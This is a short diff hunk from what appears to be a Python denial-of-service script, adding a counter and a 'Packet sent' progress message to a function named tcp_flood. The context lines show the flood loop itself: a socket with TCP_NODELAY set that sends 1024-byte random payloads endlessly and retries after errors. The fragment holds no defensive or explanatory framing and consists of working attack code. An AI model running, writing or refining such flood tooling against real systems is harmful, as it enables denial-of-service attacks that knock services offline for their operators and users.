@@ -24,6 +24,8 @@ def tcp_flood():
             s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
             while True:
                 s.sendall(random_payload(1024))
+                count+=1
+                print(f"[-] Packet sent... ({count})")
         except Exception:
             s.close()
             time.sleep(0.05)
